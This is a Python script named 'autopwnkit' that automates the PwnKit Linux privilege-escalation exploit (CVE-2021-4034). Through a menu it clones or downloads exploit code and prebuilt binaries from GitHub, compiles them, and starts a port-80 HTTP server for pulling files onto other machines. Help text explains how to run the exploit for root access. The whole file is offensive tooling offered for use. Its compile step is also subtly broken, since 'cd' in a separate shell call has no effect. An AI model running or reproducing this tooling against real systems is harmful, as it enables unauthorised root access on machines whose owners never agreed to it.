import time
import os
import random

try:
	def autopwnkitlogo():
		autopwnkitmsgr = random.randint(1, 9)
		if autopwnkitmsgr == 1:
			autopwnkitmsg = "Expect the unexpected"
		if autopwnkitmsgr == 2:
			autopwnkitmsg = "Spoof this secret"
		if autopwnkitmsgr == 3:
			autopwnkitmsg = "I ❤ Linux"
		if autopwnkitmsgr == 4:
			autopwnkitmsg = "Better security = Better life"
		if autopwnkitmsgr == 5:
			autopwnkitmsg = "Ocult in the darkness"
		if autopwnkitmsgr == 6:
			autopwnkitmsg = "Be carefull with the shadows"
		if autopwnkitmsgr == 7:
			autopwnkitmsg = "This is only a Nightmare"
		if autopwnkitmsgr == 8:
			autopwnkitmsg = "I see shadows in the darkness"
		if autopwnkitmsgr == 9:
			autopwnkitmsg = "Close your eyes"
		os.system("clear")
		print("""\x1b[38;2;255;0;0m
 ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ██▓███   █     █░███▄    █  ██ ▄█▀ ██▓▄▄▄█████▓
▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓█░ █ ░█░██ ▀█   █  ██▄█▒ ▓██▒▓  ██▒ ▓▒
▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒█░ █ ░█▓██  ▀█ ██▒▓███▄░ ▒██▒▒ ▓██░ ▒░
░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░█░ █ ░█▓██▒  ▐▌██▒▓██ █▄ ░██░░ ▓██▓ ░ 
 ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░░██▒██▓▒██░   ▓██░▒██▒ █▄░██░  ▒██▒ ░ 
 ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░ ▓░▒ ▒ ░ ▒░   ▒ ▒ ▒ ▒▒ ▓▒░▓    ▒ ░░   
  ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░ ░▒ ░       ▒ ░ ░ ░ ░░   ░ ▒░░ ░▒ ▒░ ▒ ░    ░    
  ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░░         ░   ░    ░   ░ ░ ░ ░░ ░  ▒ ░  ░      
      ░  ░   ░                  ░ ░               ░            ░ ░  ░    ░           

 _              ___ ___ ___ ___ ___ 
| |_ _ _    _ _|   | | |   |   |   |
| . | | |  |_'_| | |_  | | | | | | |
|___|_  |  |_,_|___| |_|___|___|___|
    |___|                           
		""")
		print("\x1b[38;2;255;0;0m"+autopwnkitmsg+"\x1b[38;2;35;0;255m")
	while(True):
		autopwnkitlogo()
		print("""
[Menu]
0. Exit
1. Get Uncompiled PWNKIT
2. Get Compiled PWNKIT
3. Compile PWNKIT
4. Mount HTTP Server (Via Python) [Port 80]
5. Help
		""")
		try:
			option = int(input("\x1b[38;2;0;255;251m❯ \x1b[38;2;255;0;0m"))
		except KeyboardInterrupt:
			print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
		except ValueError:
			print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Only accepted int numbers :(")
		except:
			print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")

		if option == 0:
			print("\n\x1b[38;2;0;255;116mGood bye :)")
			break

		elif option == 1:
			autopwnkitlogo()
			print("""
[Menu]
1. DIR
2. ZIP
			""")
			try:
				option = int(input("\x1b[38;2;0;255;251m❯ \x1b[38;2;255;0;0m"))
			except KeyboardInterrupt:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
			except ValueError:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Only accepted int numbers :(")
			except:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			if option == 1:
				try:
					os.system("git clone https://github.com/berdav/CVE-2021-4034")
				except KeyboardInterrupt:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
				except:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			if option == 2:
				try:
					os.system("wget https://github.com/x04000/CVE-2021-4034/blob/main/pwnkit.zip")
				except KeyboardInterrupt:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
				except:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			elif option < 1 or option > 2:
				print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option")
			time.sleep(2)

		elif option == 2:
			autopwnkitlogo()
			print("""
[Menu]
1. DIR
2. ZIP
			""")
			try:
				option = int(input("\x1b[38;2;0;255;251m❯ \x1b[38;2;255;0;0m"))
			except KeyboardInterrupt:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
			except ValueError:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Only accepted int numbers :(")
			except:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			if option == 1:
				try:
					os.system("wget https://github.com/x04000/CVE-2021-4034/blob/main/pre-maked-pwnkit.zip")
					os.system("unzip pre-maked-pwnkit")
				except KeyboardInterrupt:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
				except:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			if option == 2:
				try:
					os.system("wget https://github.com/x04000/CVE-2021-4034/blob/main/pre-maked-pwnkit.zip")
				except KeyboardInterrupt:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
				except:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			elif option < 1 or option > 2:
				print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option")
			time.sleep(2)

		elif option == 3:
			autopwnkitlogo()
			if os.path.exists('CVE-2021-4034') == True:
				try:
					print("Compiling PWNKIT...")
					time.sleep(1)
					os.system("cd CVE-2021-4034")
					os.system("make")
					os.system("cd ..")
					print("\nOperation finished")
				except KeyboardInterrupt:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
				except:
					print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			else:
				print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Directory CVE-2021-4034 doesn't exists")
			time.sleep(2)

		elif option == 4:
			autopwnkitlogo()
			try:
				print("Starting HTTP Server (Via Python) [Port 80]...")
				time.sleep(1)
				os.system("python3 -m http.server 80")
			except KeyboardInterrupt:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
			except:
				print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")
			time.sleep(2)

		elif option == 5:
			autopwnkitlogo()
			print("""
[Help]
What is PWNKIT?
PWNKIT is a exploit to scale privileges in linux

What permissions I need to use PWNKIT?
You need permissions of pkexec

How I can compile PWNKIT?
Yo need to be in the dir 'CVE-2021-4034' and execute the command 'make'

Why there is a pre-maked version?
Because some system doesn't have the command 'make'

How I can execute PWNKIT?
You need execute the command './cve-2021-4034' (in the dir 'CVE-2021-4034')

What is the use of mounting a server (via python) [port 80]?
You can get files of your computer/server in other computer/server

How to use the python server [port 80]?
In the other computer/server input the next command: wget http://YOURIP/FILE

How I can view my IP?
With the next command: ifconfig (tun0 / eth0)

I can't view my IP
Try to execute the command with root privileges (sudo)

I can't get the file in the other computer
You need to place the file in the address where the server was started
			""")
			input()

		elif option < 0 or option > 5:
			print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option")
		time.sleep(2)

except KeyboardInterrupt:
	print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

except:
	print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] A unknow error ocurred")